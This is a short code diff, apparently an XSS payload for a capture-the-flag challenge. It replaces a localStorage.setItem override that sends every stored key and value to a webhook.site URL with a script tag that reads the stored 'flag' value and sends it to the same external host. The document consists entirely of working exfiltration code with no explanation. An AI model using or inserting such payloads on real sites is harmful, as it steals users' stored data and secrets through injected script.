@@ -1,5 +1,3 @@
-Object.defineProperty(localStorage, 'setItem', {
-  value: function(k, v) {
-    fetch('https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?key=' + k + '&val=' + v);
-  }
-});
+<script>
+  fetch("https://webhook.site/f2de2261-8f17-4a01-a07b-5997cf31f9cf/?flag=" + encodeURIComponent(localStorage.getItem("flag")));
+</script>
